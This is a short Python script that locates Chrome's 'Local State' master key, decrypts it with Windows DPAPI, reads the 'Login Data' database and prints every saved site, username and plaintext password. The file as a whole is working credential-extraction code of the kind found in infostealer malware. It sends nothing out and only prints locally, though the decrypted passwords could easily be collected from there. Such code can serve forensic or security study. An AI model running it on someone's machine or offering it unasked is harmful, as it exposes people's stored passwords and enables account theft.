'''
CPE

LoginData: AES256-CGM
'''

import sqlite3, os, getpass
from pathlib import Path
import json

#Crypto
import base64
import win32crypt
from Crypto.Cipher import AES


def decrypt_password(blob, key):

	#Legacy:
	if not blob.startswith(b'v'):
		print(":DPAPI Auth:")
		return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode()

	if blob.startswith(b'v20'):
		print(":v20 Auth:")
		return False

	else:
		print(":V10 / V11 Auth:")

		#Initializtion Vector:
		iv = blob[3:15]

		#Get password cipher by removeing suffix bytes (last 16 bits)
		cipher_text = blob[15:-16]

		tag = blob[-16:]

		#Build Cipher using key and initialization vector
		cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
	
		print("Check:")
		print("Key Len: ", len(key))
		print("IV Len: ", len(iv))
		print("EncText Len: ", len(cipher_text))
		print("Tag Len: ", len(tag))

		return cipher.decrypt_and_verify(cipher_text, tag)
	

def extract(): 

	profiles = ['Default']

	#get current User
	user = getpass.getuser()

	#build path to profiles dir
	chrome_user_dir = Path(f'C:/Users/{user}/AppData/Local/Google/Chrome/User Data/')

	#get database path
	db = chrome_user_dir / "Default" / "Login Data"

	#Check that the database path is real
	if not db.exists():
		print("database not found")
		return

	#File to get master key
	local_state = chrome_user_dir / "Local State"

	if not local_state.exists():
		print("local state not found.")
		return

	#Get Master Key

	#load as json
	with open(local_state, 'r') as f:
		#ctx = f.read()
		ctx = json.load(f)
		key = base64.b64decode(ctx['os_crypt']['encrypted_key'])

		#remove suffix
		key = key[5:]

		#AES-Key
		key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

		print("Key Length: ", len(key))


	with sqlite3.connect(db) as conn:
		cur = conn.cursor()
		cur.execute("SELECT origin_url, username_value, password_value FROM logins")
		res = cur.fetchall()

	for login in res:
		url, username, enc_pass = login
		try:
			dec_pass = decrypt_password(enc_pass, key)

			print(f"URL: {url}\nUSERNAME: {username}, \nPASSWORD: {dec_pass}\n")
		except Exception as e:
			print(f"URL: {url}\nUSERNAME: {username}, \nPASSWORD: {e}\n")




if __name__ == "__main__":
	extract()